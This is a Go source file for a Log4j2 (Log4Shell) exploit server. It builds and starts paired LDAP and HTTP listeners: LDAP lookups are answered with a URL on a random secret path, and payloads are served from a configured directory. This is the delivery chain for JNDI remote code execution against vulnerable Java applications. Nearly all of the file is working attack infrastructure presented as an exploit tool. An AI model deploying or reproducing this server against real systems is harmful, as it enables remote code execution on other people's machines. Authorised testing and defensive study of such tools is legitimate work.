package log4j2

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/For-ACGN/ldapserver"
	"github.com/pkg/errors"
)

// Config contains configurations about log4j2-exploit server.
type Config struct {
	LogOut io.Writer

	Hostname   string
	PayloadDir string

	HTTPNetwork string
	HTTPAddress string
	LDAPNetwork string
	LDAPAddress string

	EnableTLS bool
	TLSCert   tls.Certificate
}

// Log4j2 is used to exploit Apache Log4j2 vulnerability easily.
// It contains ldap and http server.
type Log4j2 struct {
	logger    *log.Logger
	enableTLS bool

	httpListener net.Listener
	httpHandler  *httpHandler
	httpServer   *http.Server

	ldapListener net.Listener
	ldapHandler  *ldapHandler
	ldapServer   *ldapserver.Server

	mu sync.Mutex
	wg sync.WaitGroup
}

// New is used to create a new log4j2-exploit server.
func New(cfg *Config) (*Log4j2, error) {
	logger := log.New(cfg.LogOut, "", log.LstdFlags)
	ldapserver.Logger = logger

	// initial tls config
	var tlsConfig *tls.Config
	if cfg.EnableTLS {
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{cfg.TLSCert},
		}
	}

	// for generate random http handler
	secret := generateSecret()

	// initialize http server
	httpListener, err := net.Listen(cfg.HTTPNetwork, cfg.HTTPAddress)
	if err != nil {
		return nil, errors.Wrap(err, "failed to create http listener")
	}
	httpHandler := httpHandler{
		logger:     logger,
		payloadDir: cfg.PayloadDir,
		secret:     secret,
	}
	httpServer := http.Server{
		Handler:      &httpHandler,
		TLSConfig:    tlsConfig,
		ReadTimeout:  time.Minute,
		WriteTimeout: time.Minute,
		IdleTimeout:  time.Minute,
		ErrorLog:     logger,
	}

	// initialize ldap server
	ldapListener, err := net.Listen(cfg.LDAPNetwork, cfg.LDAPAddress)
	if err != nil {
		return nil, errors.Wrap(err, "failed to create ldap listener")
	}
	var scheme string
	if cfg.EnableTLS {
		scheme = "https"
	} else {
		scheme = "http"
	}
	_, port, err := net.SplitHostPort(httpListener.Addr().String())
	if err != nil {
		return nil, errors.WithStack(err)
	}
	addr := net.JoinHostPort(cfg.Hostname, port)
	url := fmt.Sprintf("%s://%s/%s/", scheme, addr, secret)
	ldapHandler := ldapHandler{
		logger: logger,
		url:    url,
	}
	ldapRoute := ldapserver.NewRouteMux()
	ldapRoute.Bind(ldapHandler.handleBind)
	ldapRoute.Search(ldapHandler.handleSearch)
	ldapServer := ldapserver.NewServer()
	ldapServer.Handle(ldapRoute)
	ldapServer.TLSConfig = tlsConfig
	ldapServer.ReadTimeout = time.Minute
	ldapServer.WriteTimeout = time.Minute

	// create log4j2-exploit server
	log4j2 := Log4j2{
		logger:       logger,
		enableTLS:    cfg.EnableTLS,
		httpListener: httpListener,
		httpHandler:  &httpHandler,
		httpServer:   &httpServer,
		ldapListener: ldapListener,
		ldapHandler:  &ldapHandler,
		ldapServer:   ldapServer,
	}
	return &log4j2, nil
}

// Start is used to start log4j2-exploit server.
func (log4j2 *Log4j2) Start() error {
	log4j2.mu.Lock()
	defer log4j2.mu.Unlock()

	errCh := make(chan error, 2)
	// start http server
	log4j2.wg.Add(1)
	go func() {
		defer log4j2.wg.Done()
		var err error
		if log4j2.enableTLS {
			err = log4j2.httpServer.ServeTLS(log4j2.httpListener, "", "")
		} else {
			err = log4j2.httpServer.Serve(log4j2.httpListener)
		}
		errCh <- err
	}()

	// start ldap server
	log4j2.wg.Add(1)
	go func() {
		defer log4j2.wg.Done()
		var err error
		if log4j2.enableTLS {
			err = log4j2.ldapServer.ServeTLS(log4j2.ldapListener)
		} else {
			err = log4j2.ldapServer.Serve(log4j2.ldapListener)
		}
		errCh <- err
	}()

	select {
	case err := <-errCh:
		return err
	case <-time.After(time.Second):
	}
	log4j2.logger.Println("[info]", "start http server", log4j2.httpListener.Addr())
	log4j2.logger.Println("[info]", "start ldap server", log4j2.ldapListener.Addr())
	log4j2.logger.Println("[info]", "start log4j2-exploit server successfully")
	return nil
}

// Stop is used to stop log4j2-exploit server.
func (log4j2 *Log4j2) Stop() error {
	log4j2.mu.Lock()
	defer log4j2.mu.Unlock()

	// close http server
	err := log4j2.httpServer.Close()
	if err != nil {
		return errors.Wrap(err, "failed to close http server")
	}
	log4j2.logger.Println("[info]", "http server is stopped")

	// close ldap server
	log4j2.ldapServer.Stop()
	log4j2.logger.Println("[info]", "ldap server is stopped")

	log4j2.wg.Wait()
	log4j2.logger.Println("[info]", "log4j2-exploit server is stopped")
	return nil
}

func generateSecret() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	str := make([]rune, 8)
	for i := 0; i < 8; i++ {
		s := ' ' + 1 + r.Intn(90)
		switch {
		case s >= '0' && s <= '9':
		case s >= 'A' && s <= 'Z':
		case s >= 'a' && s <= 'z':
		default:
			i--
			continue
		}
		str[i] = rune(s)
	}
	return string(str)
}
